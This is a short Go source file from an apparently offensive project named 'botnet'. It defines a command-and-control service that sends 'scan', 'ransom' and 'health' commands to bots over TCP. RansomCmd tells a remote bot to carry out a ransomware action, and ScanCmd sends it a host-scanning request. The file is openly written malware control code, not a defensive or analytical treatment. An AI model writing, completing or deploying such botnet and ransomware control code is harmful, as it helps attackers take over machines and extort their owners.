package tcp

import (
	"github.com/threeaccents/botnet"
	"github.com/threeaccents/botnet/libs/bytesutil"
)

//ScanCmd is
func (c *CommanderService) ScanCmd(addr string) error {
	botnet.Msg("sending scan request")
	req := &scanRequest{
		Type:  "simple",
		Hosts: []string{"127.0.0.1"},
	}
	b, err := bytesutil.Marshal(req)
	if err != nil {
		return err
	}
	payload := append(commandToBytes("scan"), b...)
	return sendData(addr, payload)
}

//RansomCmd is
func (c *CommanderService) RansomCmd(addr string) error {
	return sendData(addr, commandToBytes("ransom"))
}

//CheckBotHealth is
func (c *CommanderService) CheckBotHealth(bot *botnet.Bot) error {
	return sendData(bot.Addr(), commandToBytes("health"))
}
